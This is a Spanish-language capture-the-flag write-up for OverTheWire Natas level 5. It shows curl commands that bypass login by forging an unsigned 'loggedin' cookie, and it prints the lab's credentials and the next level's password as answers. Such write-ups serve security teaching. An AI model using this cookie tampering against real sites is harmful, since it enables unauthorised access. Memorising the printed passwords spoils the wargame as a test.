# Natas Level05

## Descripción
> **Level Goal (natas5.natas.labs.overthewire.org):** "Access disallowed. You are not logged in." La aplicación controla si el usuario "inició sesión" mediante una cookie.

## Solución
Al pedir la página sin más, el servidor fija una cookie `loggedin=0`. Como la cookie no está firmada ni cifrada, el cliente puede simplemente enviarla con el valor que quiera.

```bash
curl -s -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M -c cookies.jar http://natas5.natas.labs.overthewire.org/
# cookie recibida: loggedin=0

curl -s -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M -b "loggedin=1" http://natas5.natas.labs.overthewire.org/
# Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
```

## Notas adicionales
- Igual que el nivel 4, pero con una cookie en vez de un header: el cliente controla el valor por completo, así que cualquier lógica de "sesión" que dependa solo de un valor de cookie plano y no verificado en servidor es inútil como control de seguridad.

## Referencias
- Reto original: http://natas5.natas.labs.overthewire.org/
- Apoyo: https://curl.se/docs/manpage.html (opciones `-b`/`-c` para enviar/guardar cookies)
